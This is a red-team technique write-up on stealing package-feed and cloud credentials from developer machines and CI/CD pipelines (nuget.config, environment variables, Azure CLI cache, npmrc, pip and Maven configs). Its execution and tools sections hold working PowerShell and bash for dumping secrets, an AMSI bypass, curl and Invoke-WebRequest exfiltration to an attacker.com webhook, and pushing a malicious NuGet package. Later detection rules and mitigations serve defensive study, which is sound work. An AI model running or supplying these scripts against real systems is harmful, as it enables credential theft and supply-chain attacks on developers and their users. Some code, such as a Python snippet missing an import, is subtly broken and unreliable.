# [CA-TOKEN-017]: Package Source Credential Theft

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-017 |
| **MITRE ATT&CK v18.1** | [Steal Application Access Token (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / DevOps / M365 |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | Azure DevOps (All versions), NuGet 4.0+, .NET 4.5+, PowerShell 3.0+ |
| **Patched In** | Mitigation via credential management best practices |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 4 (Environmental Reconnaissance) and 6 (Atomic Red Team) not included because: (1) No specific Atomic test exists for NuGet credential theft in the public library, (2) Reconnaissance for package source credentials is implicit in execution methods. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Package source credential theft targets the authentication mechanisms used by developers and CI/CD systems to access private NuGet feeds, npm registries, Maven repositories, and other package management systems hosted on Azure DevOps or cloud-based infrastructure. Attackers who compromise a developer's machine, CI/CD pipeline, or build agent can extract credentials stored in plaintext or weakly encrypted configuration files (e.g., `nuget.config`, `.npm`, `.maven`, `pip.ini`), authentication caches, or environment variables. These credentials (Personal Access Tokens, API keys, or service principal secrets) grant access to proprietary package sources and CI/CD automation, enabling unauthorized code injection, lateral movement, supply chain attacks, and data exfiltration.

**Attack Surface:** 
- **nuget.config** files containing plaintext credentials for Azure Artifacts feeds
- **Environment variables** storing API tokens or PATs in CI/CD pipelines
- **Credential cache directories** (`~/.azure`, `%USERPROFILE%\.nuget`, `.m2/settings.xml`)
- **Build logs** and pipeline execution logs containing secrets
- **Application configuration files** checked into source repositories
- **Azure Instance Metadata Service (IMDS)** for managed identity token theft

**Business Impact:** **Complete compromise of package repositories and CI/CD pipelines.** An attacker with stolen package credentials can:
- Inject malicious code into private package feeds (supply chain attack)
- Publish backdoored versions of internal libraries to CI/CD consumers
- Exfiltrate proprietary source code and intellectual property
- Pivot to additional cloud resources using stolen service principal credentials
- Establish persistent access to the entire development infrastructure

**Technical Context:** Package source credential theft typically occurs post-exploitation (after gaining initial access to a developer workstation, build agent, or cloud VM). The attack is rapid—credentials can be extracted in seconds—and has moderate-to-low detection likelihood if the attacker uses native tooling and avoids triggering EDR alerts. Reversibility is impossible once credentials are used; only remediation via credential rotation prevents ongoing abuse.

### Operational Risk

- **Execution Risk:** **Medium** — Requires prior access to a host containing the credentials; no privilege escalation needed.
- **Stealth:** **High** — Reading configuration files and environment variables generates minimal logging; native PowerShell/bash commands evade command-line logging if AMSI/auditd is disabled.
- **Reversibility:** **No** — Once exfiltrated, credentials are immediately reusable by the attacker; only credential rotation mitigates.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 2.1.3 / 2.2.2 | Ensure credentials are not hard-coded in configuration files; Enforce credential management policies |
| **DISA STIG** | SI-4 (WN10-00-000001) | Monitor system for unauthorized access; implement secure secret storage |
| **CISA SCuBA** | ID.AM-3 | Asset management: Inventory and manage all authentication mechanisms |
| **NIST 800-53** | AC-2, SA-3 | Account management; System development lifecycle security |
| **GDPR** | Art. 32 | Security of Processing; implement technical measures to protect personal data |
| **DORA** | Art. 9 | Protection and Prevention of information security incidents |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; incident response and monitoring |
| **ISO 27001** | A.6.1.2, A.9.2.3 | Access control implementation; privileged access rights management |
| **ISO 27005** | Risk Scenario: "Compromise of Authentication Credentials" | Unauthorized access via stolen tokens/secrets |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- **Minimum:** User-level access to the target system (developer workstation, build agent, or container)
- **Ideal:** Local administrator or container root for unrestricted file access

**Required Access:** 
- Network access to the target system (RDP, SSH, physical access) OR compromise via malware/vulnerability
- Read access to configuration directories and environment variables

**Supported Versions:**
- **Azure DevOps:** All versions (cloud and on-premises)
- **NuGet:** Version 4.0+
- **.NET Framework / .NET Core:** 4.5+, .NET 6.0+
- **PowerShell:** 3.0+
- **Bash/Linux:** All distributions with standard utilities

**Tools:**
- [PowerShell](https://learn.microsoft.com/en-us/powershell/) (Built-in on Windows)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Optional; for credential cache extraction)
- [NuGet.exe](https://www.nuget.org/downloads) (Version 5.0+)
- [ripgrep / grep](https://github.com/BurntSushi/ripgrep) (For searching credentials in files)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extracting Credentials from nuget.config (Windows/Cross-Platform)

**Supported Versions:** All (Windows, macOS, Linux)

#### Step 1: Locate nuget.config Files

**Objective:** Discover all `nuget.config` files on the system that may contain package source credentials.

**Command (Windows PowerShell):**
```powershell
# Search for nuget.config files in common locations
$configPaths = @(
    "$env:USERPROFILE\.nuget\nuget.config",
    "$env:APPDATA\.nuget\nuget.config",
    "$env:ProgramFiles\NuGet\Config",
    "C:\Program Files (x86)\NuGet\Config",
    "$env:USERPROFILE\AppData\Local\NuGet",
    (Get-ChildItem -Path $env:USERPROFILE -Filter "nuget.config" -Recurse -ErrorAction SilentlyContinue).FullName
)

foreach ($path in $configPaths) {
    if (Test-Path $path) {
        Write-Host "[+] Found: $path" -ForegroundColor Green
        Get-Item $path
    }
}

# Alternative: Search across entire filesystem (requires admin)
Get-ChildItem -Path C:\ -Filter "nuget.config" -Recurse -ErrorAction SilentlyContinue | Select-Object -Property FullName, LastWriteTime
```

**Command (Linux/macOS Bash):**
```bash
# Search for nuget.config in standard locations
find $HOME -name "nuget.config" -type f 2>/dev/null
find /etc -name "nuget.config" -type f 2>/dev/null
locate nuget.config 2>/dev/null

# Search across entire filesystem (requires time and permissions)
find / -name "nuget.config" -type f 2>/dev/null | head -20
```

**Expected Output:**
```
[+] Found: C:\Users\developer\.nuget\nuget.config
[+] Found: C:\Projects\MyProject\nuget.config
```

**What This Means:**
- Each `nuget.config` file is a potential source of credentials
- Files in `~/.nuget/` are user-level and likely to contain PATs or API keys
- Project-level `nuget.config` files in source repositories may also store credentials

#### Step 2: Extract Credentials from nuget.config Files

**Objective:** Parse `nuget.config` XML and extract plaintext or weakly encrypted credentials.

**Command (Windows PowerShell):**
```powershell
# Read and parse nuget.config
$configPath = "$env:USERPROFILE\.nuget\nuget.config"

if (Test-Path $configPath) {
    [xml]$config = Get-Content $configPath
    
    # Extract package source credentials
    $credentials = $config.configuration.packageSourceCredentials.ChildNodes
    
    foreach ($source in $credentials) {
        Write-Host "[+] Package Source: $($source.Name)" -ForegroundColor Yellow
        
        foreach ($cred in $source.ChildNodes) {
            $key = $cred.key
            $value = $cred.value
            
            if ($key -eq "Username") {
                Write-Host "    Username: $value" -ForegroundColor Green
            }
            elseif ($key -in @("ClearTextPassword", "Password")) {
                Write-Host "    $key`: $value" -ForegroundColor Red
            }
        }
    }
}
```

**Command (Linux/macOS Bash):**
```bash
CONFIG_PATH="$HOME/.nuget/nuget.config"

if [ -f "$CONFIG_PATH" ]; then
    echo "[+] Extracting credentials from $CONFIG_PATH"
    grep -A 5 "<packageSourceCredentials>" "$CONFIG_PATH" | grep -E "(Username|Password|ClearTextPassword)" | sed 's/.*value="\([^"]*\)".*/\1/'
fi

# Alternative using Python for XML parsing
python3 << 'EOF'
import xml.etree.ElementTree as ET

config_path = f"{os.path.expanduser('~')}/.nuget/nuget.config"
if os.path.exists(config_path):
    tree = ET.parse(config_path)
    root = tree.getroot()
    
    for source in root.findall('.//packageSourceCredentials'):
        for child in source:
            print(f"[+] Source: {child.tag}")
            for cred in child:
                print(f"    {cred.get('key')}: {cred.get('value')}")
EOF
```

**Expected Output:**
```
[+] Package Source: fabrikam-devops-artifacts
    Username: devops@company.com
    ClearTextPassword: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

**What This Means:**
- `ClearTextPassword` or `Password` entries contain API tokens or PATs
- These credentials grant access to the Azure Artifacts feed
- The token can be used to authenticate as the original user with full feed permissions

**OpSec & Evasion:**
- Use `-ErrorAction SilentlyContinue` to suppress errors and reduce logs
- Run from a PowerShell session with `-NoProfile -NonInteractive` to bypass logging
- Disable AMSI before executing the command: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
- Detection likelihood: **Medium** — File access may be logged; credentials in plaintext are easy to spot in forensics

**Troubleshooting:**
- **Error:** "nuget.config file not found"
  - **Cause:** File location differs from expected paths
  - **Fix:** Use recursive file search: `Get-ChildItem -Recurse -Filter "nuget.config"`

- **Error:** "Unable to parse XML"
  - **Cause:** XML is malformed or uses different encoding
  - **Fix:** Use `Get-Content -Encoding UTF8` or read as plain text and extract with regex

#### Step 3: Exfiltrate Credentials

**Objective:** Steal extracted credentials for later use by the attacker.

**Command (Windows PowerShell - Send via HTTPS):**
```powershell
# Exfiltrate credentials to attacker-controlled server
$credentials = "devops@company.com:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
$webhookUrl = "https://attacker.com/webhook"

$body = @{
    credentials = $credentials
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
} | ConvertTo-Json

try {
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $body -ContentType "application/json" -UseBasicParsing
    Write-Host "[+] Credentials exfiltrated successfully" -ForegroundColor Green
}
catch {
    Write-Host "[-] Exfiltration failed: $_" -ForegroundColor Red
}
```

**Command (Linux Bash - Using curl):**
```bash
CREDS="devops@company.com:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
WEBHOOK_URL="https://attacker.com/webhook"
HOSTNAME=$(hostname)
USERNAME=$(whoami)
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")

curl -X POST \
  -H "Content-Type: application/json" \
  -d "{\"credentials\":\"$CREDS\",\"hostname\":\"$HOSTNAME\",\"username\":\"$USERNAME\",\"timestamp\":\"$TIMESTAMP\"}" \
  "$WEBHOOK_URL" 2>/dev/null
```

**Expected Output:**
```
[+] Credentials exfiltrated successfully
```

**What This Means:**
- Attacker now has the PAT or API key
- Credentials can be used immediately to access Azure Artifacts and deploy malicious packages

---

### METHOD 2: Extracting Credentials from Environment Variables (CI/CD Pipelines)

**Supported Versions:** Azure DevOps, GitHub Actions, GitLab CI, Jenkins (All versions)

#### Step 1: Enumerate Environment Variables

**Objective:** Discover environment variables that contain PATs, API keys, or service principal secrets in CI/CD pipeline contexts.

**Command (PowerShell in Azure Pipelines):**
```powershell
# List all environment variables (many CI/CD systems expose secrets as env vars)
Write-Host "[+] Environment Variables with potential credentials:" -ForegroundColor Yellow

# Common patterns for secrets in environment variables
$secretPatterns = @(
    "*TOKEN*",
    "*PASSWORD*",
    "*SECRET*",
    "*KEY*",
    "*PAT*",
    "*CREDENTIAL*",
    "*APIKEY*"
)

$allEnvVars = Get-ChildItem env:

foreach ($pattern in $secretPatterns) {
    $matches = $allEnvVars | Where-Object {$_.Name -like $pattern}
    
    foreach ($match in $matches) {
        Write-Host "    $($match.Name): $(($match.Value).Substring(0, [Math]::Min(20, $match.Value.Length)))..." -ForegroundColor Green
    }
}

# Dump entire environment for CI/CD tokens
Write-Host "`n[+] System.AccessToken (Azure Pipelines):" -ForegroundColor Yellow
if ($env:SYSTEM_ACCESSTOKEN) {
    Write-Host "    SYSTEM_ACCESSTOKEN: $($env:SYSTEM_ACCESSTOKEN.Substring(0, 20))..." -ForegroundColor Red
}

# Check for .NET-specific credentials
Write-Host "`n[+] NuGet Feed Credentials (from env vars):" -ForegroundColor Yellow
if ($env:NUGET_CREDENTIALPROVIDER_SESSIONTOKEN) {
    Write-Host "    NUGET_CREDENTIALPROVIDER_SESSIONTOKEN: Found" -ForegroundColor Red
}
```

**Command (Bash in Azure Pipelines / GitHub Actions):**
```bash
echo "[+] Environment Variables with potential credentials:"
env | grep -iE "(TOKEN|PASSWORD|SECRET|KEY|PAT|CREDENTIAL|APIKEY)" | while read line; do
    VAR_NAME=$(echo "$line" | cut -d'=' -f1)
    VAR_VALUE=$(echo "$line" | cut -d'=' -f2)
    if [ ! -z "$VAR_VALUE" ]; then
        echo "    $VAR_NAME: ${VAR_VALUE:0:20}..."
    fi
done

# Azure Pipelines-specific
echo ""
echo "[+] Azure Pipelines System.AccessToken:"
echo "    SYSTEM_ACCESSTOKEN: ${SYSTEM_ACCESSTOKEN:0:20}..."

# GitHub Actions-specific
echo ""
echo "[+] GitHub Actions secrets:"
env | grep "^GITHUB_TOKEN\|^INPUT_" | head -5
```

**Expected Output:**
```
[+] Environment Variables with potential credentials:
    SYSTEM_ACCESSTOKEN: eyJ0eXAiOiJKV1QiLCJhb...
    FEED_PAT: gqv6blyprd7yqrvyzx4a...
    AZURE_CLIENT_SECRET: abCdEf123456789gHiJk...
```

**What This Means:**
- `SYSTEM_ACCESSTOKEN` is a short-lived PAT provided by Azure Pipelines for that build
- Custom variables like `FEED_PAT` are developer-created secrets (often long-lived)
- These tokens grant CI/CD access to package feeds, Azure resources, and deployment targets

#### Step 2: Use Stolen Token to Access Package Feed

**Objective:** Authenticate to Azure Artifacts feed using the stolen PAT.

**Command (PowerShell):**
```powershell
# Build credentials object from stolen PAT
$pat = "gqv6blyprd7yqrvyzx4a"
$base64pat = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(":$pat"))

$headers = @{
    "Authorization" = "Basic $base64pat"
}

# Query Azure Artifacts feed for packages
$feedUrl = "https://pkgs.dev.azure.com/company/_packaging/internal-feed/nuget/v3/index.json"

try {
    $response = Invoke-WebRequest -Uri $feedUrl -Headers $headers -UseBasicParsing
    Write-Host "[+] Successfully authenticated to feed" -ForegroundColor Green
    Write-Host "    Feed URL: $feedUrl" -ForegroundColor Yellow
}
catch {
    Write-Host "[-] Authentication failed: $_" -ForegroundColor Red
}
```

**Command (Bash):**
```bash
PAT="gqv6blyprd7yqrvyzx4a"
FEED_URL="https://pkgs.dev.azure.com/company/_packaging/internal-feed/nuget/v3/index.json"

# Encode PAT for Basic auth
ENCODED_PAT=$(echo -n ":$PAT" | base64)

# Query feed
curl -s -H "Authorization: Basic $ENCODED_PAT" "$FEED_URL" | head -20

echo "[+] Feed authenticated and queried"
```

**Expected Output:**
```
[+] Successfully authenticated to feed
    Feed URL: https://pkgs.dev.azure.com/company/_packaging/internal-feed/nuget/v3/index.json
```

**What This Means:**
- Attacker can now query the feed and enumerate packages
- Next step: Push malicious packages to compromise consumers

---

### METHOD 3: Credential Cache Extraction (macOS/Linux)

**Supported Versions:** macOS 10.12+, Linux (Ubuntu, CentOS, etc.)

#### Step 1: Extract Azure CLI Credentials Cache

**Objective:** Steal cached Azure credentials from `~/.azure` directory.

**Command (Bash):**
```bash
AZURE_CONFIG="$HOME/.azure"

if [ -d "$AZURE_CONFIG" ]; then
    echo "[+] Extracting Azure CLI cached credentials..."
    
    # List cached subscriptions and access tokens
    if [ -f "$AZURE_CONFIG/msal_token_cache.json" ]; then
        echo "[+] Found MSAL token cache:"
        cat "$AZURE_CONFIG/msal_token_cache.json" | grep -o '"access_token":"[^"]*"' | head -3
    fi
    
    # Extract cloud configuration
    if [ -f "$AZURE_CONFIG/clouds.config" ]; then
        echo "[+] Cloud endpoints:"
        cat "$AZURE_CONFIG/clouds.config"
    fi
    
    # List all files
    echo "[+] Contents of ~/.azure:"
    ls -la "$AZURE_CONFIG/"
fi
```

**Expected Output:**
```
[+] Found MSAL token cache:
"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjQy..."
```

**What This Means:**
- Azure CLI tokens are cached for quick re-authentication
- These tokens have long lifespans and grant access to Azure subscriptions
- Attacker can use these to authenticate as the original user

#### Step 2: Decode and Reuse JWT Tokens

**Objective:** Decode stolen JWT tokens to understand their permissions and validity.

**Command (Bash + Python):**
```bash
#!/bin/bash
# Decode JWT token from cache

TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjQy..."

python3 << 'EOF'
import json
import base64
import sys

def decode_jwt(token):
    try:
        # JWT format: header.payload.signature
        parts = token.split('.')
        
        # Decode payload (add padding if needed)
        payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        
        data = json.loads(decoded)
        print("[+] JWT Decoded:")
        print(json.dumps(data, indent=2))
        
        # Extract useful info
        print("\n[+] Token Details:")
        print(f"    Issued at (iat): {data.get('iat', 'N/A')}")
        print(f"    Expires (exp): {data.get('exp', 'N/A')}")
        print(f"    User: {data.get('upn', 'N/A')}")
        print(f"    App ID: {data.get('appid', 'N/A')}")
        
    except Exception as e:
        print(f"[-] Error decoding token: {e}")

token = sys.argv[1] if len(sys.argv) > 1 else "$TOKEN"
decode_jwt(token)
EOF
```

**Expected Output:**
```
[+] JWT Decoded:
{
  "aud": "https://management.azure.com/",
  "iss": "https://sts.windows.net/tenant-id/",
  "iat": 1704710400,
  "exp": 1704714000,
  "upn": "developer@company.onmicrosoft.com",
  "appid": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
  ...
}

[+] Token Details:
    Issued at (iat): 1704710400
    Expires (exp): 1704714000
    User: developer@company.onmicrosoft.com
    App ID: 04b07795-8ddb-461a-bbee-02f9e1bf7b46
```

**What This Means:**
- Token is valid for Azure subscription access
- `exp` (expiration) is typically 1 hour, but refresh tokens extend this
- Attacker can use this token immediately for Azure API calls

---

### METHOD 4: Package Manager Credential File Extraction (npm, pip, Maven)

**Supported Versions:** npm 5.0+, pip 19.0+, Maven 3.0+

#### Step 1: Extract npm Credentials

**Objective:** Steal npm registry tokens from `~/.npmrc`.

**Command (Bash):**
```bash
NPM_RC="$HOME/.npmrc"

if [ -f "$NPM_RC" ]; then
    echo "[+] npm credentials found:"
    cat "$NPM_RC" | grep -E "(_authToken|_auth|password)" | grep -v "^;" | grep -v "^#"
fi

# Also check global npmrc
if [ -f "/etc/npmrc" ]; then
    echo "[+] Global npm config:"
    cat "/etc/npmrc" | grep -E "(_authToken|_auth)"
fi

# Check npm cache directory for token usage
echo "[+] npm cache token usage:"
find "$HOME/.npm" -type f -exec grep -l "authToken" {} \; 2>/dev/null | head -5
```

**Expected Output:**
```
//registry.npmjs.org/:_authToken=npm_abcdef123456789ghijklmnop
//mycompany.jfrog.io/artifactory/api/npm/npm-local/:_auth=YWRtaW46aWZyb2d0ZGVmYXVsdA==
```

**What This Means:**
- `_authToken` is the npm registry authentication token
- `_auth` is Base64-encoded `username:password`
- These tokens grant access to private npm packages

#### Step 2: Extract pip Credentials

**Objective:** Steal pip repository credentials from config files and environment.

**Command (Bash):**
```bash
# Check pip config
PIP_CONFIG="$HOME/.pip/pip.conf"
if [ -f "$PIP_CONFIG" ]; then
    echo "[+] pip config:"
    cat "$PIP_CONFIG" | grep -iE "(username|password|token|index)"
fi

# Check .pypirc (Python package index credentials)
PYPIRC="$HOME/.pypirc"
if [ -f "$PYPIRC" ]; then
    echo "[+] PyPI credentials:"
    cat "$PYPIRC" | grep -iE "(username|password|repository)"
fi

# Check environment variables
echo "[+] Python/pip environment secrets:"
env | grep -iE "(PIP_|TWINE_|PYPI_)" 
```

**Expected Output:**
```
[+] pip config:
[global]
index-url = https://username:password@pypi.company.com/simple/
index-servers =
    pypi
    company-pypi

[pypi]
repository = https://upload.pypi.org/legacy/
username = myuser
password = mypassword
```

#### Step 3: Extract Maven Credentials

**Objective:** Steal Maven repository credentials from `~/.m2/settings.xml`.

**Command (Bash):**
```bash
M2_SETTINGS="$HOME/.m2/settings.xml"

if [ -f "$M2_SETTINGS" ]; then
    echo "[+] Maven credentials found:"
    grep -A 2 "<server>" "$M2_SETTINGS" | grep -E "(id|username|password)"
fi
```

**Expected Output:**
```
<id>company-artifacts</id>
<username>devops</username>
<password>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</password>
```

---

## 7. TOOLS & COMMANDS REFERENCE

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.40+  
**Minimum Version:** 2.0  
**Supported Platforms:** Windows, macOS, Linux

**Installation (Windows):**
```powershell
# Using WinGet
winget install Microsoft.AzureCLI

# Using Chocolatey
choco install azure-cli

# Manual download
# Visit https://aka.ms/InstallAzureCLIDev
```

**Usage:**
```bash
# Login with stolen token
az devops login --organization https://dev.azure.com/company --token "gqv6blyprd7yqrvyzx4a"

# List artifact feeds
az artifacts universal list-feed

# Download packages from feed
az artifacts universal download --feed internal-feed --name MyPackage --version 1.0.0
```

### [NuGet.exe](https://www.nuget.org/downloads)

**Version:** 5.0+  
**Minimum Version:** 4.0  
**Supported Platforms:** Windows, macOS, Linux (.NET CLI)

**Installation:**
```powershell
# Download directly
Invoke-WebRequest -Uri "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" -OutFile "C:\Tools\nuget.exe"

# Or use dotnet CLI (preferred)
dotnet tool install --global nuget
```

**Usage:**
```bash
# Add package source with stolen credentials
nuget sources add -name "private-feed" -source "https://pkgs.dev.azure.com/company/_packaging/internal-feed/nuget/v3/index.json" -Username "PAT_USERNAME" -Password "gqv6blyprd7yqrvyzx4a"

# List packages from feed
nuget list -Source "private-feed"

# Push malicious package (supply chain attack)
nuget push "MaliciousPackage.1.0.0.nupkg" -Source "private-feed"
```

### [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Optional)

**Version:** Latest (2.2.0-20220519)  
**For:** Extracting cached credentials from memory and credential manager

**Installation:**
```powershell
# Download from GitHub
$repo = "gentilkiwi/mimikatz"
$release = Invoke-WebRequest -Uri "https://api.github.com/repos/$repo/releases/latest" | ConvertFrom-Json
$zip = $release.assets[0].browser_download_url
Invoke-WebRequest -Uri $zip -OutFile "mimikatz.zip"
Expand-Archive -Path "mimikatz.zip" -DestinationPath "C:\Tools\mimikatz"
```

**Usage (Extracting CredMan):**
```
mimikatz # token::list  # List access tokens in memory
mimikatz # dpapi::cache  # Extract cached credentials
mimikatz # vault::list  # List Windows Credential Manager entries
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Suspicious nuget.config File Access

**Rule Configuration:**
- **Required Index:** `main`, `endpoint`, or `windows`
- **Required Sourcetype:** `WinEventLog:Security`, `XmlWinEventLog`
- **Required Fields:** `EventID`, `ObjectName`, `Account`, `Accesses`
- **Alert Threshold:** > 3 access events to nuget.config in 5 minutes
- **Applies To Versions:** Windows Server 2016+, Windows 10+

**SPL Query:**
```spl
index=main sourcetype="WinEventLog:Security" EventID=4663 ObjectName="*nuget.config"
| stats count by Account, ObjectName, Accesses, Computer
| where count > 3
| table Computer, Account, ObjectName, count, Accesses
```

**What This Detects:**
- Lateral movement on a compromised system to steal developer credentials
- Multiple reads of `nuget.config` indicate exfiltration or reconnaissance
- Account name reveals which user account is being abused

**Manual Configuration Steps (Splunk):**
1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `Number of results > 3`
6. Configure **Action** → **Send email** to SOC team

### Rule 2: Environment Variables Containing Credentials

**Rule Configuration:**
- **Required Index:** `azure_activity`, `main`
- **Required Sourcetype:** `azure:aad:audit`, `AzureOperationalLog`
- **Required Fields:** `OperationName`, `InitiatedBy`, `AADTenantId`
- **Alert Threshold:** Any occurrence
- **Applies To Versions:** Azure DevOps (all), GitHub Actions (all)

**SPL Query (Azure Pipelines):**
```spl
index=azure_activity OperationName="Build completed" 
| search "System.AccessToken" OR "FEED_PAT" OR "SYSTEM_ACCESSTOKEN"
| table BuildID, InitiatedBy, System.AccessToken, TimeGenerated
```

**SPL Query (Generic - Log Analysis):**
```spl
index=main sourcetype="powershell" CommandLine="*Environment*TOKEN*" OR CommandLine="*env:*PASSWORD*"
| table TimeGenerated, User, CommandLine, ComputerName
```

**What This Detects:**
- PowerShell commands accessing environment variables with secrets
- CI/CD pipeline steps that expose credentials in logs
- Unauthorized API token usage from non-standard locations

**Source:** [Microsoft Security Engineering](https://microsoft.com/security/), [Splunk Threat Research](https://www.splunk.com/en_us/blog/security/)

#### False Positive Analysis

- **Legitimate Activity:** Developers running `dotnet restore` with credentials (expected during builds)
- **Benign Tools:** Visual Studio, Azure DevOps Build Agent (expected to read credential files)
- **Tuning:** Exclude service accounts: `| where Account!="*svc_*"` or whitelist known build servers

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Package Feed Access via Stolen Token

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AuditLogs`, `AzureDevOpsAuditing` (if available)
- **Required Fields:** `ipAddress`, `UserPrincipalName`, `ResourceDisplayName`, `OperationName`
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Azure DevOps (all), Entra ID

**KQL Query:**
```kusto
SigninLogs
| where AppDisplayName has_any("Azure DevOps", "Artifacts", "NuGet")
| where ClientAppUsed == "Other clients" or UserAgent has "nuget" or UserAgent has "dotnet"
| join kind=inner (
    IdentityInfo
    | project UserPrincipalName, isGuest
) on UserPrincipalName
| where isGuest == false
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, ClientAppUsed, Location
| where IPAddress !in ("WHITELIST_IPS")
| summarize LoginCount = count() by UserPrincipalName, IPAddress, TimeGenerated bin=5m
| where LoginCount > 5
```

**What This Detects:**
- Programmatic access (e.g., `NuGet.exe`, `dotnet`) to package feeds
- Logins from unexpected IP addresses using non-interactive clients
- Multiple rapid authentication attempts (brute force or credential reuse)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Package Feed Token Usage`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Suspicious Package Feed Token Usage" `
  -Query @"
SigninLogs
| where AppDisplayName has_any("Azure DevOps", "Artifacts", "NuGet")
| where ClientAppUsed == "Other clients"
"@ `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel GitHub](https://github.com/Azure/Azure-Sentinel)

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4663 (File Object Access)**
- **Log Source:** Security Event Log
- **Trigger:** File read/write to `nuget.config`, `.npmrc`, `pip.conf`, etc.
- **Filter:** `ObjectName contains "nuget.config" AND Accesses contains "Read Data"`
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit File System** → **Success and Failure**
4. Set filter for specific files via File Auditing (SACL):
   ```powershell
   # Add SACL to nuget.config
   icacls "C:\Users\developer\.nuget\nuget.config" /grant:r "Everyone:(OI)(CI)F" /audit:s
   ```
5. Run `gpupdate /force` on target machines

**Expected Log Entry:**
```
Event ID: 4663
Task Category: File System
Accesses: Read Data (or Write Data)
ObjectName: C:\Users\developer\.nuget\nuget.config
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable Multi-Factor Authentication (MFA) for All DevOps Accounts**
  - **Applies To Versions:** Azure DevOps (all), GitHub (all)
  - **Impact:** Even if a PAT is stolen, the attacker cannot use it without MFA
  
  **Manual Steps (Azure DevOps Portal):**
  1. Go to **User Settings** → **Security** → **Multi-factor authentication**
  2. Click **Enable multi-factor authentication**
  3. Choose authentication method (Microsoft Authenticator, phone, etc.)
  4. Complete MFA enrollment

  **Manual Steps (PowerShell):**
  ```powershell
  # Force MFA requirement for all users via Conditional Access
  $caPolicy = New-AzConditionalAccessPolicy -DisplayName "Require MFA for DevOps Access" `
    -Conditions (New-AzConditionalAccessConditionSet `
      -Applications (New-AzConditionalAccessApplicationCondition -IncludeApplicationId "04b07795-8ddb-461a-bbee-02f9e1bf7b46") `
      -Users (New-AzConditionalAccessUserCondition -IncludeUserIds "All")) `
    -GrantControls (New-AzConditionalAccessGrantControls -Operator "OR" -AuthenticationStrength "Mfa")
  ```

- **Rotate All Existing PATs and API Keys Immediately**
  - **Applies To Versions:** Azure DevOps (all)
  - **Steps:**
    1. Go to **User Settings** → **Personal Access Tokens**
    2. For each token, click **Revoke**
    3. Click **New Token** → Select required scopes (minimal: "Packaging (read)")
    4. Copy new token and update all CI/CD pipelines

- **Disable Personal Access Tokens in Favor of Service Principals**
  - **Applies To Versions:** Azure DevOps 2020+
  - **Benefits:** Service principals support certificate-based authentication and conditional access
  
  **Manual Steps:**
  1. Go to **Organization Settings** → **Policies**
  2. Disable: **Allow public projects**
  3. Enable: **Restrict creation of classic pipelines**
  4. Enable: **Disable creation of TFVC repositories**

- **Implement Credential Scanning in CI/CD Pipelines**
  - **Tools:** [TruffleHog](https://github.com/trufflesecurity/truffleHog), [GitGuardian](https://www.gitguardian.com/), [Microsoft Credential Scanner](https://github.com/microsoft/credentialscan)
  
  **Manual Steps (Azure Pipelines):**
  ```yaml
  trigger:
    - main
  
  pool:
    vmImage: 'ubuntu-latest'
  
